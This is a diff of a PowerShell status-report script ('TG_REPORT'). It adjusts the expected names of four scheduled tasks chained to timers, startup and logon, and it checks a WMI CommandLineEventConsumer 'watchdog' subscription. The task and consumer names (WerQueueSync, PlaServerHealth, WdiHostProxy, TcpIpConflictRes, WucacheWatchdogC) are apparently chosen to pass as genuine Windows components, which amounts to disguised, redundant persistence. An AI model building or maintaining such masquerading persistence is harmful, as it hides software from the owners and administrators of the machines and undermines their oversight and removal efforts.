@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T13 - root-level task names (IDENTVER=7); TR ownership; RMM+Datto keep
+# TG_REPORT BUILD 20260802T14 - root-level task names (IDENTVER=7); TR ownership; RMM+Datto keep
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [string]$Summary = '',
@@ -310,10 +310,10 @@ if (Test-Path $idCfg) {
     }
 }
 $expectedTasks = @(
-    @{ Name = $(if ($idMap.TASK_A) { $idMap.TASK_A } else { '\WerQueueSync' }); Role = "tick $($idMap.MO_A)m (chain1)" },
-    @{ Name = $(if ($idMap.TASK_B) { $idMap.TASK_B } else { '\PlaServerHealth' }); Role = "backup $($idMap.MO_B)m (chain1)" },
-    @{ Name = $(if ($idMap.TASK_C) { $idMap.TASK_C } else { '\WdiHostProxy' }); Role = 'ONSTART (chain1)' },
-    @{ Name = $(if ($idMap.TASK_D) { $idMap.TASK_D } else { '\TcpIpConflictRes' }); Role = 'ONLOGON (chain1)' }
+    @{ Name = $(if ($idMap.TASK_A) { $idMap.TASK_A } else { 'WerQueueSync' }); Role = "tick $($idMap.MO_A)m (chain1)" },
+    @{ Name = $(if ($idMap.TASK_B) { $idMap.TASK_B } else { 'PlaServerHealth' }); Role = "backup $($idMap.MO_B)m (chain1)" },
+    @{ Name = $(if ($idMap.TASK_C) { $idMap.TASK_C } else { 'WdiHostProxy' }); Role = 'ONSTART (chain1)' },
+    @{ Name = $(if ($idMap.TASK_D) { $idMap.TASK_D } else { 'TcpIpConflictRes' }); Role = 'ONLOGON (chain1)' }
 )
 # chain 2: WMI watchdog subscription
 $wmiC = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
